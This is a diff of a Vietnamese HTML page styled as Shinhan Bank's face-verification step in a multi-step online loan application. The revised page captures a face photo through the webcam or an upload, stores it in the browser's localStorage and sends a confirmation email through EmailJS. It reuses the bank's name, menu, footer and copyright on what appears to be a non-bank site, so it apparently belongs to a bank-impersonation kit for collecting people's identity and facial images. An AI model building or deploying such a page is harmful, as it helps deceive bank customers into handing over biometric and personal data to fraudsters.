@@ -3,342 +3,290 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Minh Khuôn Mặt - Shinhan Bank</title>
+    <title>Shinhan Bank - Xác Minh Khuôn Mặt</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.26/webcam.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
+        :root {
+            --primary-color: #003087;
+            --secondary-color: #f5f6f5;
+            --accent-color: #ff6200;
+        }
         body {
             font-family: 'Roboto', sans-serif;
-            font-size: 16px;
-            background-color: #f8f9fa;
-            margin: 0;
+            background-color: var(--secondary-color);
         }
-        .header {
-            padding: 15px;
-            background-color: #ffffff;
-            border-bottom: 1px solid #b3cde0;
+        .navbar {
+            background-color: var(--primary-color);
+        }
+        .navbar-brand img {
+            height: 50px;
+        }
+        .navbar-nav .nav-link {
+            color: white !important;
+            transition: color 0.3s;
+        }
+        .navbar-nav .nav-link:hover {
+            color: var(--accent-color) !important;
+        }
+        .step-indicator {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .header img {
-            height: 35px;
-        }
-        .header-icons {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        .header-icons i {
-            font-size: 24px;
-            cursor: pointer;
-            color: #0052cc;
-        }
-        .container {
-            max-width: 90%;
-            width: 100%;
-            margin: 0 auto;
-            padding: 25px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            position: relative;
-        }
-        @media (min-width: 768px) {
-            .container {
-                max-width: 700px;
-                margin: 0 auto;
-            }
-        }
-        .nav-tabs {
-            display: flex;
-            justify-content: space-around;
-            margin-bottom: 25px;
-            margin-top: 0;
-            flex-wrap: nowrap;
-        }
-        .nav-tabs .nav-item {
-            flex: 1;
-            text-align: center;
-        }
-        .nav-tabs .nav-link {
-            background-color: #d3d3d3;
-            color: #ffffff;
-            border-radius: 20px;
-            padding: 8px 16px;
-            font-weight: 500;
-            font-size: 14px;
-            width: 100%;
-            margin: 0 5px;
-        }
-        .nav-tabs .nav-link.active {
-            background-color: #0033a0;
-            color: #ffffff;
-        }
-        .step-title {
-            color: #003087;
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            text-align: center;
-        }
-        .step-description {
-            font-size: 14px;
-            text-align: center;
-            margin-bottom: 20px;
-            color: #1a3c87;
-        }
-        .face-scan-container {
-            position: relative;
-            margin-bottom: 20px;
-        }
-        .face-scan-canvas {
-            width: 100%;
-            max-width: 400px;
-            height: 300px;
-            border: 2px solid #dee2e6;
-            border-radius: 5px;
-            display: block;
-            margin: 0 auto;
-        }
-        .face-overlay {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 200px;
-            height: 250px;
-            border: 2px dashed #003087;
-            border-radius: 50%;
-            pointer-events: none;
-        }
-        .face-feedback {
-            text-align: center;
-            margin-top: 10px;
-            font-size: 14px;
-            color: #1a3c87;
-        }
-        .progress-bar-face {
-            height: 10px;
-            background-color: #e9ecef;
-            border-radius: 5px;
-            overflow: hidden;
-            width: 100%;
-            max-width: 400px;
-            margin: 0 auto;
-        }
-        .progress-bar-face-fill {
-            height: 100%;
-            background-color: #003087;
-            transition: width 0.3s ease-in-out;
-        }
-        .file-upload-box {
-            border: 2px dashed #b3cde0;
-            border-radius: 20px;
-            padding: 15px;
-            text-align: center;
-            background-color: #f9f9f9;
-            width: 100%;
-            max-width: 500px;
-            height: 100px;
-            display: flex;
-            flex-direction: column;
             justify-content: center;
-            align-items: center;
-            margin: 0 auto;
+            margin: 20px 0;
+            position: relative;
         }
-        .file-upload-box label {
-            cursor: pointer;
-            color: #003087;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        .file-upload-box input {
-            display: none;
-        }
-        .file-info {
-            margin-top: 5px;
-            font-size: 12px;
-            color: #666;
-        }
-        .capture-btn {
-            background-color: #0033a0;
-            border: none;
+        .step {
+            padding: 10px 20px;
+            margin: 0 10px;
             border-radius: 20px;
-            padding: 6px 12px;
-            font-weight: 500;
-            font-size: 14px;
-            color: #ffffff;
-            margin-top: 5px;
-            transition: background-color 0.3s ease;
+            background-color: #d3d3d3;
+            color: #333;
+            font-weight: bold;
+            position: relative;
+            z-index: 1;
+            transition: all 0.3s;
+            font-size: 0.9rem;
         }
-        .capture-btn:hover {
-            background-color: #0052cc;
+        .step.active {
+            background-color: var(--accent-color);
+            color: white;
         }
-        .capture-btn i {
+        .step::before {
+            content: '\f058';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
             margin-right: 5px;
         }
-        .btn-primary {
-            background-color: #0033a0;
-            border: none;
-            border-radius: 20px;
-            padding: 10px 20px;
-            font-weight: 700;
-            font-size: 14px;
-            transition: background-color 0.3s ease;
-            margin: 5px;
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 10%;
+            right: 10%;
+            height: 3px;
+            background-color: #d3d3d3;
+            z-index: 0;
         }
-        .btn-primary:hover {
-            background-color: #0052cc;
-        }
-        .btn-primary:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-        }
-        .btn-primary.small {
-            padding: 6px 12px;
-            font-size: 14px;
-        }
-        .footer {
+        .progress-percentage {
             text-align: center;
-            padding: 20px;
-            background-color: #003087;
-            color: white;
-            margin-top: 20px;
-            font-size: 12px;
-        }
-        .footer-links a {
-            color: #b3cde0;
-            margin: 0 10px;
-            text-decoration: none;
-        }
-        .footer-links a:hover {
-            color: #ffffff;
-        }
-        .button-group {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 15px;
-        }
-        .error-message {
-            color: #dc3545;
-            font-size: 14px;
-            font-weight: 500;
-            text-align: center;
-            margin-top: 5px;
-            padding: 8px;
-            background-color: #ffe6e6;
-            border-radius: 5px;
-            display: none;
-        }
-        .form-label {
-            font-weight: 400;
-            color: #1a3c87;
-            font-size: 14px;
-            margin-bottom: 5px;
-            text-align: center;
-            width: 100%;
-        }
-        .form-group {
-            position: relative;
+            font-size: 1rem;
+            color: var(--primary-color);
             margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #d3d3d3;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
         }
-        .form-group:last-child {
-            border-bottom: none;
-        }
-        .divider-blue {
-            border-top: 1px solid #b3cde0;
+        .upload-section {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
             margin: 15px 0;
         }
-        .action-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
+        .upload-section h3 {
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--accent-color);
+            padding-bottom: 8px;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+        .upload-section img, #webcam {
+            max-width: 100%;
+            height: auto;
             margin-top: 10px;
+            border-radius: 5px;
+        }
+        .btn-primary {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+            padding: 8px 15px;
+            font-size: 0.9rem;
+            transition: background-color 0.3s;
+        }
+        .btn-primary:hover {
+            background-color: var(--accent-color);
+            border-color: var(--accent-color);
+        }
+        .btn-secondary {
+            padding: 8px 15px;
+            font-size: 0.9rem;
+        }
+        .footer-links a {
+            margin: 0 8px;
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        .footer-links a:hover {
+            color: var(--accent-color);
+        }
+        .error {
+            color: #dc3545;
+            font-size: 0.8rem;
+            margin-top: 3px;
+        }
+        .success-message {
+            color: #28a745;
+            font-size: 0.8rem;
+            margin-top: 5px;
+            display: none;
+        }
+        .spinner {
+            display: none;
+            margin-left: 8px;
+        }
+        .block-message {
+            background: #fff3cd;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin: 20px 0;
+            color: #856404;
+        }
+        .modal-body img {
+            max-width: 100%;
+        }
+        @media (max-width: 768px) {
+            .navbar-brand img {
+                height: 40px;
+            }
+            .step-indicator {
+                display: none;
+            }
+            .progress-percentage {
+                font-size: 0.9rem;
+            }
+            .upload-section {
+                padding: 10px;
+            }
+            .upload-section h3 {
+                font-size: 1rem;
+            }
+            .btn-primary, .btn-secondary {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+            #webcam {
+                width: 100% !important;
+                height: auto !important;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
-        <div class="header-icons">
-            <i class="bi bi-search"></i>
-            <div class="dropdown">
-                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
-                <ul class="dropdown-menu dropdown-menu-end">
-                    <li><a class="dropdown-item" href="#">GIỚI THIỆU</a></li>
-                    <li><a class="dropdown-item" href="#">LỢI ÍCH</a></li>
-                    <li><a class="dropdown-item" href="#">GIẤY TỜ CẦN THIẾT</a></li>
-                    <li><a class="dropdown-item" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
-                    <li><a class="dropdown-item" href="#">XEM KẾT QUẢ</a></li>
-                </ul>
+    <header>
+        <nav class="navbar navbar-expand-lg">
+            <div class="container">
+                <a class="navbar-brand" href="#"><img src="https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo" alt="Shinhan Bank Logo"></a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarNav">
+                    <ul class="navbar-nav ms-auto">
+                        <li class="nav-item"><a class="nav-link" href="#">GIỚI THIỆU</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">LỢI ÍCH</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">GIẤY TỜ CẦN THIẾT</a></li>
+                        <li class="nav-item"><a class="nav-link active" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">XEM KẾT QUẢ</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">ĐIỀU KHOẢN SỬ DỤNG</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">LIÊN HỆ</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">MESSENGER</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <main class="container mt-3">
+        <div class="progress-percentage">Tiến trình: 37.5% (Bước 3/8)</div>
+        <div class="step-indicator">
+            <div class="step">1. Nhập thông tin</div>
+            <div class="step">2. Xác thực và xử lý</div>
+            <div class="step active">3. Hoàn thành</div>
+        </div>
+
+        <div id="blockMessage" class="block-message" style="display: none;">
+            <p><strong>Thông báo:</strong> Đã có hồ sơ đăng ký tại Ngân hàng Shinhan. Vui lòng liên hệ hỗ trợ để biết thêm chi tiết.</p>
+        </div>
+
+        <div id="faceVerificationContent">
+            <h2 class="text-center mb-3">XÁC MINH KHUÔN MẶT</h2>
+            <p class="text-center">Vui lòng quét khuôn mặt hoặc tải lên ảnh khuôn mặt để xác minh. Đảm bảo ánh sáng tốt và không đeo kính/khẩu trang.</p>
+
+            <div class="accordion" id="faceAccordion">
+                <div class="accordion-item">
+                    <h2 class="accordion-header">
+                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#webcamSection" aria-expanded="true" aria-controls="webcamSection">
+                            Quét Khuôn Mặt
+                        </button>
+                    </h2>
+                    <div id="webcamSection" class="accordion-collapse collapse show" data-bs-parent="#faceAccordion">
+                        <div class="accordion-body">
+                            <div id="webcam" style="width: 320px; height: 240px; margin: 0 auto;"></div>
+                            <p id="webcamStatus" class="text-center mt-2">Đang chờ khuôn mặt...</p>
+                            <p id="webcamError" class="error text-center"></p>
+                            <p id="webcamSuccess" class="success-message text-center">Ảnh khuôn mặt đã được chụp!</p>
+                            <div class="text-center mt-2">
+                                <button class="btn btn-primary" onclick="takeSnapshot()">Quét Khuôn Mặt</button>
+                                <button class="btn btn-secondary" onclick="resetWebcam()">Thử Lại</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#uploadSection" aria-expanded="false" aria-controls="uploadSection">
+                            Chọn Ảnh Khuôn Mặt
+                        </button>
+                    </h2>
+                    <div id="uploadSection" class="accordion-collapse collapse" data-bs-parent="#faceAccordion">
+                        <div class="accordion-body">
+                            <p>Ảnh cần rõ nét, hiển thị toàn bộ khuôn mặt, không chỉnh sửa.</p>
+                            <input type="file" id="faceImage" accept="image/jpeg,image/png" aria-label="Tải ảnh khuôn mặt">
+                            <div id="faceImagePreview" class="mt-2"></div>
+                            <p id="faceImageError" class="error"></p>
+                            <p id="faceImageSuccess" class="success-message">Ảnh khuôn mặt đã được tải lên!</p>
+                            <div class="mt-2">
+                                <button class="btn btn-primary" onclick="captureFaceImage()">Chụp ảnh</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="d-flex justify-content-between mt-3 flex-column flex-md-row">
+                <div class="mb-2 mb-md-0">
+                    <a href="step2.html" class="btn btn-outline-secondary">QUAY LẠI</a>
+                    <button type="button" class="btn btn-outline-danger ms-2" onclick="resetProgress()">XÓA TIẾN TRÌNH</button>
+                </div>
+                <button class="btn btn-primary position-relative" onclick="nextStep()">
+                    BƯỚC KẾ TIẾP
+                    <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Error Modal -->
+    <div class="modal fade" id="errorModal" tabindex="-1" aria-labelledby="errorModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="errorModalLabel">Lỗi Webcam</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body" id="errorModalBody">
+                    <!-- Error message populated dynamically -->
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Đóng</button>
+                </div>
             </div>
         </div>
     </div>
-    <hr class="divider-blue" style="margin: 0;">
 
-    <div class="container">
-        <ul class="nav-tabs">
-            <li class="nav-item">
-                <a class="nav-link" href="#">1. Nhập thông tin</a>
-            </li>
-            <li class="nav-item">
-                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
-            </li>
-            <li class="nav-item">
-                <a class="nav-link active" href="#">3. Hoàn thành</a>
-            </li>
-        </ul>
-
-        <div id="step4" class="step-transition">
-            <h5 class="step-title">Xác Minh Khuôn Mặt</h5>
-            <p class="step-description">Vui lòng quét khuôn mặt hoặc tải lên ảnh khuôn mặt để xác minh.</p>
-            <div class="form-group">
-                <div class="face-scan-container">
-                    <canvas id="faceScanCanvas" class="face-scan-canvas"></canvas>
-                    <div class="face-overlay"></div>
-                    <div class="face-feedback" id="faceFeedback">
-                        Đang chờ khuôn mặt...
-                    </div>
-                    <div class="progress-bar-face" id="faceProgressBar">
-                        <div class="progress-bar-face-fill" id="faceProgressFill" style="width: 0%"></div>
-                    </div>
-                </div>
-                <div class="action-buttons">
-                    <button type="button" class="btn btn-primary small" id="startFaceScan">Quét Khuôn Mặt</button>
-                </div>
-            </div>
-
-            <hr class="divider-blue">
-
-            <div class="form-group">
-                <label for="faceImage" class="form-label">Chọn Ảnh Khuôn Mặt</label>
-                <div class="file-upload-box">
-                    <label for="faceImage" aria-label="Tải lên ảnh khuôn mặt">Tải ảnh lên</label>
-                    <input type="file" id="faceImage" accept="image/jpeg,image/png">
-                    <button type="button" class="capture-btn" id="captureFacePhoto" aria-label="Chụp ảnh khuôn mặt"><i class="bi bi-camera"></i> Chụp ảnh</button>
-                    <div class="file-info" id="faceImageInfo" aria-live="polite"></div>
-                    <div class="error-message" id="faceImageError"></div>
-                </div>
-            </div>
-
-            <hr class="divider-blue">
-
-            <div class="button-group">
-                <a href="/vaytieudung/shinhanbank/pages/vi/step2.html" class="btn btn-primary">QUAY LẠI</a>
-                <button id="proceedToStep5Btn" class="btn btn-primary" disabled>BƯỚC KẾ TIẾP</button>
-            </div>
-        </div>
-
-        <div class="footer">
+    <footer class="bg-light py-3 mt-4">
+        <div class="container text-center">
             <div class="footer-links">
                 <a href="#">Chính sách bảo mật</a> |
                 <a href="#">Điều khoản sử dụng</a> |
@@ -347,165 +295,169 @@
                 <a href="#">Hướng dẫn truy cập web</a> |
                 <a href="#">Sitemap</a>
             </div>
-            <p class="mt-3">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
+            <p class="mt-2">
+                Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu
+            </p>
             <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
+            <p>Ngân hàng Shinhan được quản lý bởi Ngân hàng Nhà nước Việt Nam.</p>
         </div>
-    </div>
+    </footer>
 
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.18.0/dist/tf.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-detection@1.0.0/dist/face-detection.min.js"></script>
     <script>
-        let videoStream = null;
-        let faceDetected = false;
-        let faceDetector = null;
+        // Initialize EmailJS
+        emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS User ID
 
-        async function loadFaceDetector() {
-            const model = faceDetection.SupportedModels.MediaPipeFaceDetector;
-            const detectorConfig = {
-                runtime: 'tfjs',
-                maxFaces: 1
-            };
-            faceDetector = await faceDetection.createDetector(model, detectorConfig);
-        }
-
-        function startVideoStream() {
-            const canvas = document.getElementById('faceScanCanvas');
-            const ctx = canvas.getContext('2d');
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-                    .then(stream => {
-                        videoStream = stream;
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.play();
-                        video.onloadedmetadata = () => {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            detectFaces(video, ctx);
-                        };
-                    })
-                    .catch(err => {
-                        console.error("Error accessing camera:", err);
-                        $('#faceFeedback').text('Không thể truy cập camera. Vui lòng thử lại hoặc tải lên ảnh.');
-                    });
-            } else {
-                $('#faceFeedback').text('Thiết bị không hỗ trợ truy cập camera. Vui lòng tải lên ảnh.');
-            }
-        }
-
-        async function detectFaces(video, ctx) {
-            let faceDetectionCount = 0;
-            const feedback = document.getElementById('faceFeedback');
-            const progressFill = document.getElementById('faceProgressFill');
-
-            const detectLoop = async () => {
-                if (!videoStream) return;
-
-                ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-                const faces = await faceDetector.estimateFaces(video);
-
-                if (faces.length > 0) {
-                    feedback.textContent = 'Đã phát hiện khuôn mặt. Vui lòng giữ yên...';
-                    faceDetectionCount++;
-                    const progress = Math.min(faceDetectionCount * 10, 100);
-                    progressFill.style.width = `${progress}%`;
-
-                    if (faceDetectionCount >= 10) {
-                        feedback.textContent = 'Khuôn mặt được xác minh!';
-                        stopVideoStream();
-                        faceDetected = true;
-                        updateButtonState();
-                        return;
-                    }
-                } else {
-                    feedback.textContent = 'Không phát hiện khuôn mặt. Vui lòng điều chỉnh vị trí.';
-                    faceDetectionCount = Math.max(0, faceDetectionCount - 1);
-                    const progress = Math.max(0, faceDetectionCount * 10);
-                    progressFill.style.width = `${progress}%`;
-                }
-
-                requestAnimationFrame(detectLoop);
-            };
-
-            detectLoop();
-        }
-
-        function stopVideoStream() {
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-                videoStream = null;
-            }
-        }
-
-        $('#captureFacePhoto').on('click', function() {
-            const feedback = document.getElementById('faceFeedback');
-            const input = document.getElementById('faceImage');
-            feedback.textContent = 'Đang chuẩn bị camera...';
-            input.setAttribute('capture', 'user');
-            input.click();
+        // Webcam setup
+        Webcam.set({
+            width: 320,
+            height: 240,
+            image_format: 'jpeg',
+            jpeg_quality: 90
         });
 
-        $('#faceImage').on('change', function(e) {
-            const file = e.target.files[0];
-            const inputId = e.target.id;
-            $(`#${inputId}Error`).hide();
-            $(`#faceImageInfo`).text('');
-            if (file) {
-                const maxSize = 5 * 1024 * 1024;
-                const validTypes = ['image/jpeg', 'image/png'];
-                if (!validTypes.includes(file.type)) {
-                    $(`#${inputId}Error`).text('Vui lòng chọn file JPEG hoặc PNG.').show();
-                    return;
-                }
-                if (file.size > maxSize) {
-                    $(`#${inputId}Error`).text('File quá lớn. Vui lòng chọn file dưới 5MB.').show();
-                    return;
-                }
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    $('#faceImageInfo').text(DOMPurify.sanitize(`${file.name} (${Math.round(file.size / 1024)} KB)`));
-                    $('#faceFeedback').text('Khuôn mặt được xác minh!');
-                    faceDetected = true;
-                    updateButtonState();
-                };
-                reader.readAsDataURL(file);
-            } else {
-                $('#faceImageInfo').text('');
-                $('#faceFeedback').text('Đang chờ khuôn mặt...');
-                faceDetected = false;
-                updateButtonState();
+        // Check for existing registration and load saved image
+        window.onload = function() {
+            if (localStorage.getItem('registered')) {
+                document.getElementById('blockMessage').style.display = 'block';
+                document.getElementById('faceVerificationContent').style.display = 'none';
+                return;
             }
-        });
 
-        function updateButtonState() {
-            const hasFaceImage = $('#faceImage').prop('files').length > 0;
-            $('#proceedToStep5Btn').prop('disabled', !faceDetected && !hasFaceImage);
-        }
-
-        $('#proceedToStep5Btn').on('click', function(e) {
-            e.preventDefault();
-            window.location.href = 'step4.html';
-        });
-
-        $('.btn-primary, .capture-btn').on('keypress', function(e) {
-            if (e.which === 13) {
-                $(this).click();
+            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+            if (savedData.step3?.faceImage) {
+                document.getElementById('faceImagePreview').innerHTML = `<img src="${savedData.step3.faceImage}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
+                document.getElementById('faceImageSuccess').style.display = 'block';
             }
-        });
 
-        window.onload = async function() {
-            await loadFaceDetector();
-            updateButtonState();
+            Webcam.attach('#webcam');
+            savedData.currentStep = 3;
+            localStorage.setItem('registrationData', JSON.stringify(savedData));
         };
 
-        $('#startFaceScan').on('click', function() {
-            const feedback = document.getElementById('faceFeedback');
-            feedback.textContent = 'Đang chuẩn bị camera...';
-            startVideoStream();
-        });
+        function takeSnapshot() {
+            const errorElement = document.getElementById('webcamError');
+            const successElement = document.getElementById('webcamSuccess');
+            const previewElement = document.getElementById('faceImagePreview');
+
+            Webcam.snap(function(data_uri) {
+                previewElement.innerHTML = `<img src="${data_uri}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
+                document.getElementById('webcamStatus').textContent = 'Đã chụp ảnh khuôn mặt.';
+                errorElement.textContent = '';
+                successElement.style.display = 'block';
+                saveImage(data_uri);
+                Webcam.reset();
+            }, function(error) {
+                errorElement.textContent = 'Không thể chụp ảnh. Vui lòng kiểm tra webcam.';
+                document.getElementById('errorModalBody').textContent = 'Lỗi: ' + error + '. Vui lòng đảm bảo webcam được cấp phép và hoạt động.';
+                new bootstrap.Modal(document.getElementById('errorModal')).show();
+                successElement.style.display = 'none';
+            });
+        }
+
+        function resetWebcam() {
+            Webcam.reset();
+            Webcam.attach('#webcam');
+            document.getElementById('faceImagePreview').innerHTML = '';
+            document.getElementById('webcamStatus').textContent = 'Đang chờ khuôn mặt...';
+            document.getElementById('webcamError').textContent = '';
+            document.getElementById('webcamSuccess').style.display = 'none';
+            document.getElementById('faceImage').value = '';
+            document.getElementById('faceImageError').textContent = '';
+            document.getElementById('faceImageSuccess').style.display = 'none';
+
+            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+            if (savedData.step3) {
+                delete savedData.step3.faceImage;
+                localStorage.setItem('registrationData', JSON.stringify(savedData));
+            }
+        }
+
+        function captureFaceImage() {
+            const input = document.getElementById('faceImage');
+            input.click();
+            input.onchange = function(event) {
+                const file = event.target.files[0];
+                const errorElement = document.getElementById('faceImageError');
+                const successElement = document.getElementById('faceImageSuccess');
+                const previewElement = document.getElementById('faceImagePreview');
+
+                if (!file) {
+                    errorElement.textContent = 'Vui lòng chọn một file hình ảnh.';
+                    successElement.style.display = 'none';
+                    return;
+                }
+
+                if (!['image/jpeg', 'image/png'].includes(file.type)) {
+                    errorElement.textContent = 'Chỉ chấp nhận file JPG hoặc PNG.';
+                    successElement.style.display = 'none';
+                    return;
+                }
+
+                if (file.size > 5 * 1024 * 1024) {
+                    errorElement.textContent = 'File phải nhỏ hơn 5MB.';
+                    successElement.style.display = 'none';
+                    return;
+                }
+
+                errorElement.textContent = '';
+                successElement.style.display = 'block';
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    previewElement.innerHTML = `<img src="${e.target.result}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
+                    saveImage(e.target.result);
+                };
+                reader.readAsDataURL(file);
+            };
+        }
+
+        function saveImage(dataUrl) {
+            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+            savedData.step3 = savedData.step3 || {};
+            savedData.step3.faceImage = dataUrl;
+            savedData.currentStep = 3;
+            localStorage.setItem('registrationData', JSON.stringify(savedData));
+        }
+
+        function nextStep() {
+            const faceImage = document.getElementById('faceImage').files[0] || (document.getElementById('faceImagePreview').querySelector('img') && document.getElementById('faceImagePreview').querySelector('img').src);
+            const errorElement = document.getElementById('faceImageError');
+            const spinner = document.querySelector('.spinner');
+
+            if (!faceImage) {
+                errorElement.textContent = 'Vui lòng tải lên hoặc chụp ảnh khuôn mặt.';
+                return;
+            }
+
+            spinner.style.display = 'inline-block';
+
+            // Send confirmation email
+            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+            const emailParams = {
+                to_email: savedData.step1?.email || 'user@example.com',
+                full_name: savedData.step1?.fullName || 'Khách hàng',
+                message: 'Xác minh khuôn mặt của bạn đã hoàn tất. Hồ sơ đang được xét duyệt.'
+            };
+
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', emailParams)
+                .then(() => {
+                    console.log('Face verification email sent');
+                    spinner.style.display = 'none';
+                    window.location.href = 'step4.html';
+                }, (error) => {
+                    console.error('Email sending failed:', error);
+                    alert('Lỗi khi gửi email xác nhận. Vui lòng thử lại.');
+                    spinner.style.display = 'none';
+                });
+        }
+
+        function resetProgress() {
+            if (confirm('Bạn có chắc chắn muốn xóa toàn bộ tiến trình?')) {
+                localStorage.removeItem('registrationData');
+                localStorage.removeItem('registered');
+                window.location.href = 'step1.html';
+            }
+        }
     </script>
 </body>
 </html>
